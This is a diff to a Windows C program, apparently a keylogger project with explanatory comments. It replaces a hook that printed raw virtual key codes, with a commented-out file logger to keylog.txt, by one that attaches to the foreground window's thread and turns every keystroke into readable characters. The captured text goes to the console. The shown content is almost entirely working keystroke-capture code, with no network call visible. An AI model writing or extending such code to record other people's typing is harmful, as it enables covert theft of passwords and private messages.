@@ -17,31 +17,44 @@ wParam: tells the type of keyboard message (like key down).
 
 lParam: contains a pointer to a KBDLLHOOKSTRUCT with key event info.
 */
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-  // HC_ACTION means that there is a keyboard event we should process.
-  // Checks whether the key event is a key press. WM_SYSKEYDOWN is used for keys
-  // like ALT.
-  if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
 
-    /*
-    Casts the lParam to a pointer to a KBDLLHOOKSTRUCT struct to access details
-    about the key event. vkCode is the virtual key code of the key that was
-    pressed (e.g., 65 for 'A').
-    */
-    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
-    DWORD vkCode = p->vkCode;
+        // Get foreground window and thread
+        HWND hwnd = GetForegroundWindow();
+        DWORD fgThreadId = GetWindowThreadProcessId(hwnd, NULL);
+        DWORD thisThreadId = GetCurrentThreadId();
 
-    // FILE *log = fopen("keylog.txt", "a+");
-    // if (log) {
-    //   fprintf(log, "Key: %lu\n", vkCode);
-    //  fclose(log);
-    //}
-    printf("Pressed key %lu\n", vkCode);
-  }
+        // Attach to foreground thread to get accurate keyboard state
+        if (AttachThreadInput(thisThreadId, fgThreadId, TRUE)) {
+            BYTE keyboardState[256];
+            WCHAR buffer[5];
 
-  return CallNextHookEx(hHook, nCode, wParam, lParam);
+            if (GetKeyboardState(keyboardState)) {
+                int result = ToUnicode(
+                    p->vkCode,
+                    p->scanCode,
+                    keyboardState,
+                    buffer,
+                    sizeof(buffer) / sizeof(WCHAR),
+                    0
+                );
+
+                if (result > 0) {
+                    buffer[result] = L'\0';
+                    wprintf(L"%ls", buffer);
+                    fflush(stdout);
+                }
+            }
+
+            // Detach
+            AttachThreadInput(thisThreadId, fgThreadId, FALSE);
+        }
+    }
+
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-
 int main() {
   MSG msg;
 
